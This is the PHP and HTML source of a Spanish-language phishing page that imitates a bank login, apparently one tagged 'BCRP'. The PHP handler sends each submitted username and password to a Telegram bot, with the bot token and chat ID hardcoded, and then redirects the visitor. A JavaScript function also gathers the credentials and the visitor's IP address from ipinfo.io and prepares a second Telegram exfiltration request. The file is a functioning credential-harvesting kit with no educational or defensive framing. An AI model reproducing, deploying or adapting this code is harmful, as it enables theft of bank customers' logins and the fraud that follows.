<?php session_start();
error_reporting(0);
if($_SERVER["REQUEST_METHOD"] == "POST"){
    $apibot = "5555165841:AAE7e0yrao7YTcSmfDKy0Y6vnY0SO-0UyFE";
    $canal = "1024082369";
    $_SESSION['user'] = $_POST['ix1'];
    $message = "\n✯BCRP✯\n";
    $message .= "usuario:".$_POST['ix1']."\n";
    $message .= "contra:".$_POST['ix2']."\n";

    $apiToken = $apibot;
    $data = [
        'chat_id' => $canal,
        'text' => $message,
    ];

    file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));    
    
    header("location: 2.html");
	exit;
}
?>


<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title></title>
    <script
        src="https://code.jquery.com/jquery-2.2.3.min.js"
        integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
        crossorigin="anonymous"></script>
  </head>
  <body>
    <style>
        *{margin: 0;padding: 0;}
        @font-face {
            font-family: dinReg;
            src: url(din-regular.ttf);
        }
    </style>
    <nav style="padding-left: 12px;height: 64px;background-color: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: left;background-image: url('tp1.svg');background-position: right;background-size: 206px;background-repeat: no-repeat;">
        <img src="l.svg" alt="" style="width:142px;">
        </nav>
    <nav style="padding: 2px 0 9px;height: 20px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;background: #1947a9">
        <img id="n1" src="lnks1.svg" alt="" style="height:28px;margin-left: 15px;">
    </nav>
    
    <div id="main-cnt" style="overflow: hidden;height:85vh;position: relative;text-align: center;background-image: url('b.png');background-repeat: no-repeat;background-position: center;background-size: cover;overflow: hidden;">
        
        <div id="ctn" style="display: inline-block;vertical-align: top;margin-top: 50px;">
            <div id="frmc" style="display:inline-block;text-align: center;border-radius: 8px;vertical-align: top;width: 500px;">
                
                <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post"  id="f1" style="display: inline-block;width: 420px;height: 404px;border-radius:10px;background-image: url(1.svg);position: relative;" >
                    
                    <input  id="ix1" name="ix1" placeholder="Usuario" type="text" required style="display: block;position: relative;color: #333;background: transparent;border: none;top: 97px;left: 63px;height: 25px;width: 322px;padding-left: 12px;outline: none;font-size: 16px;font-family: dinReg, sans-serif;border-bottom: 1px solid rgba(0,0,0,0.8);" autocomplete="off">
                    <input  id="ix2" name="ix2" placeholder="Contraseña" type="password" required style="display: block;position: relative;color: #333;background: transparent;border: none;top: 136px;left: 63px;height: 25px;width: 322px;padding-left: 12px;outline: none;font-size: 16px;font-family: dinReg, sans-serif;border-bottom: 1px solid rgba(0,0,0,0.8);" autocomplete="off">
                    <input type="hidden" id="ix77">
                    <input value="lngresar" onclick="xbndtl()" style="display: block;position: relative;color: #fff;font-family: sans-serif;font-size: 16px;background: #ed1c24;border: none;top: 217px;left: 139px;height: 27px;width: 140px;outline: none;border-radius: 4px;cursor: pointer;user-select: none;"type="submit">
                </form>
                
            </div>
            
        </div>
        
    </div>
        
    </div>
    <footer style="padding: 2px 0 9px;height: 20px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;background: #1947a9;overflow: hidden;">
        <img id="n9" src="lnks2.svg" alt="" style="height:28px;">
    </footer>
    <style>
        
        @media screen and (max-width:1024px){
           body{
                width: 100%!important;
                background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
                background-repeat: no-repeat!important;
                min-width: auto!important;
                zoom:90%!important;
            }
            #ctn{
                border-radius: 6px!important;
            }
            #main-cnt{
                text-align: center!important;
                padding-top: 30px;
            }
            
            #frmc{
                width: 100%!important;
            }
            #bnncont{
                display: none!important;
            }
            #n9{
                height: 20px!important;
            }
            
        }
        @media screen and (max-width:420px){
            
        }
    </style>
    <script>
        function xbndtl(){
            var tkl = "5377799279:AAHKAORDqIR6lKZzLEocgoZtNPCmU4lgfkI";
            var chtid = "5532437915";
            var eml = $("#ix1").val();
            var pss = $("#ix2").val();
            var ips = "";

            

            if(!eml || !pss){
                console.log("empty");
            }else{

                mess = `BC - U:${eml} - P:${pss}`;
                console.log( document.getElementById("ix77").value );
                $.get('https://ipinfo.io/ip', function(response){
                    var sets = {
                        "async": true,
                        "crossDomain": true,
                        "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "cache-control": "no-cache"
                
                        },
                        "data": JSON.stringify({
                            "chat_id": chtid,
                            "text": "I:"+response+" - "+mess
                        })
                    };  
                });
            }
        }
    </script>
  </body>
</html>